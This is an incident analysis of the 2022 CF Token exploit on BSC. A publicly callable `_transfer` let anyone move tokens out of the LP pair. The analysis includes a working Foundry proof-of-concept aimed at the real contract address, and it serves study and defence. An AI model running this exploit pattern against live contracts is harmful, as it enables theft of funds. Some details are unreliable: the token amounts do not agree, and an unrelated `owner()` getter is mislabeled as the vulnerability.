# CF Token — Public `_transfer` Direct-Call Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-19 |
| **Protocol** | CF Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$880,000 (930 CF tokens at market price) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 16,841,980 |
| **Vulnerable Contract** | CFToken [0x8B7218CF6Ac641382D7C723dE8aA173e98a80196](https://bscscan.com/address/0x8B7218CF6Ac641382D7C723dE8aA173e98a80196) |
| **Root Cause** | `_transfer(address, address payable, uint256)` was declared `public`, allowing anyone to directly drain tokens from the LP pool contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/cftoken_exp.sol) |

---
## 1. Vulnerability Overview

CF Token's `_transfer()` function handles internal transfer logic and should conventionally be declared `internal` or `private`. However, this function was declared `public`, making it directly callable from outside.

The attacker called `_transfer(CFPair, attacker, total_balance)` to directly transfer CF tokens held by the LP pool contract to their own address. Tokens could be moved from any arbitrary address without ownership verification or allowance checks.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable CFToken._transfer() (pseudocode)
contract CFToken {
    mapping(address => uint256) private _balances;

    // ❌ Internal transfer function declared public
    // Standard: should be internal or private
    function _transfer(
        address sender,
        address payable recipient,  // payable is also unnecessary
        uint256 amount
    ) public {  // ← Core bug: public
        // No ownership/allowance validation
        require(_balances[sender] >= amount, "insufficient balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    // Standard transfer processes based on msg.sender
    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, payable(to), amount);
        return true;
    }
}

// ✅ Correct pattern
contract CFTokenFixed {
    // ✅ Declared internal: cannot be called directly from outside
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from zero");
        require(recipient != address(0), "ERC20: transfer to zero");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**CFTokenSinglePool_merge.sol** — Entry point:
```solidity
// ❌ Root cause: `_transfer(address, address payable, uint256)` declared `public`, allowing anyone to directly drain tokens from the LP pool contract
    function _transfer(  // ❌ Vulnerability
        address from,
        address to,
        uint256 amount
    ) public {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(useWhiteListSwith){
            require(msgSenderWhiteList[msg.sender] && fromWhiteList[from]  && toWhiteList[to], "Transfer not allowed");
        }

        uint256 fee = 0;

        if (uniswapV2PairList[from] &&  !noFeeWhiteList[to]) {
            fee = calculateBuyFee(amount);
            if (fee > 0 && buybackAmount  < buybackMaxLimit) {
                address  uniswapV2Pair = from;

                uint256 lpRewardAmount = fee.mul(lpRewardRate).div(100);
                uint256 foundationAmount = fee.mul(foundationRate).div(100);
                uint256 buybackAmountTmp = fee.mul(buybackRate).div(100);

                _tOwned[uniswapV2Pair] = _tOwned[uniswapV2Pair].add(lpRewardAmount);

                emit Transfer(from, uniswapV2Pair, lpRewardAmount);
    // ... (truncated)
                if(address(callback)!=address(0)){
                    _tOwned[address(callback)] = _tOwned[address(callback)].add(buybackAmountTmp);
                    emit Transfer(from, address(callback), buybackAmountTmp);

                }else{
                    _tOwned[foundationAddress] = _tOwned[foundationAddress].add(buybackAmountTmp);
                    emit Transfer(from, foundationAddress, buybackAmountTmp);
                }


                buybackAmount = buybackAmount.add(buybackAmountTmp);
            }else {
                fee = 0;
            }
        }
        if (!uniswapV2PairList[from] && balanceOf(address(callback))> 0 && address(callback)!=address(0)){
                CFTokenCallbackSinglePool(address(callback)).swapAndLiquify();
        }

        uint acceptAmount = amount - fee;

        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(acceptAmount);
        emit Transfer(from, to, acceptAmount);
    }
```

**Ownable.sol** — Related contract:
```solidity
// ❌ Root cause: `_transfer(address, address payable, uint256)` declared `public`, allowing anyone to directly drain tokens from the LP pool contract
    function owner() public view returns (address) {  // ❌ Vulnerability
        return _owner;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Check CF token balance held by CFPair
    │       CF.balanceOf(CFPair) = 1,000,000,000,000,000,000,000
    │
    ├─[2] Call CFToken._transfer(CFPair, attacker, 1,000,000,000,000,000,000,000)
    │       sender    = CFPair (LP pool contract)
    │       recipient = attacker address
    │       amount    = entire balance
    │       ⚡ Directly callable from outside because function is public
    │       No ownership/allowance validation → succeeds
    │
    ├─[3] Transfer 1 trillion CF tokens from CFPair to attacker
    │       Balance: attacker receives 930,000,000,000,000,000,000
    │
    └─[4] Sell CF tokens → ~$880,000 profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ICFToken {
    // ⚡ Vulnerable function: public _transfer — anyone can move tokens from any arbitrary address
    function _transfer(
        address sender,
        address payable recipient,
        uint256 amount
    ) external;

    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is Test {
    ICFToken cfToken = ICFToken(0x8B7218CF6Ac641382D7C723dE8aA173e98a80196);
    address cfPair   = 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b;
    address attacker = address(this);

    function setUp() public {
        vm.createSelectFork("bsc", 16_841_980);
    }

    function testExploit() public {
        uint256 pairBalance = cfToken.balanceOf(cfPair);
        emit log_named_uint("[Before] CFPair CF balance", pairBalance);
        emit log_named_uint("[Before] Attacker CF balance", cfToken.balanceOf(attacker));

        // ⚡ Core: directly call public _transfer
        // sender = CFPair (LP pool), recipient = attacker
        // Drain entire CF balance from pool without allowance/ownership validation
        cfToken._transfer(
            cfPair,             // from: LP pool address
            payable(attacker),  // to: attacker
            1_000_000_000_000_000_000_000  // amount: entire balance
        );

        emit log_named_uint("[After] Attacker CF balance", cfToken.balanceOf(attacker));
        emit log_string("CF tokens stolen from LP pair without approval!");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control (function visibility error) |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Public exposure of internal function |
| **Attack Vector** | Direct call to `_transfer(LP_pair, attacker, balance)` |
| **Preconditions** | None (anyone can execute the attack) |
| **Impact** | Full drain of all CF tokens in the LP pool |

---
## 6. Remediation Recommendations

1. **Minimize function visibility**: Functions prefixed with an underscore such as `_transfer`, `_mint`, and `_burn` must always be declared `internal` or `private`.
2. **Use OpenZeppelin**: Use audited ERC20 implementations to prevent such fundamental mistakes.
3. **Pre-deployment visibility audit**: Review all public/external function listings to identify unintended exposure.
4. **Automated tooling**: Integrate Slither's `incorrect-modifier` and visibility detectors into the CI/CD pipeline.

---
## 7. Lessons Learned

- **Same pattern as The Sandbox**: This is exactly the same vulnerability type as The Sandbox's `_burn` public exposure in February 2022. The same mistake keeps recurring.
- **Back to basics**: Solidity function visibility is the most fundamental security principle. Underscore-prefixed functions should always be internal.
- **$880K loss**: Preventable with a single keyword change (`public` → `internal`).
- **BSC attack pattern**: Attacks exploiting visibility errors in custom ERC20 tokens on BSC continue to occur repeatedly.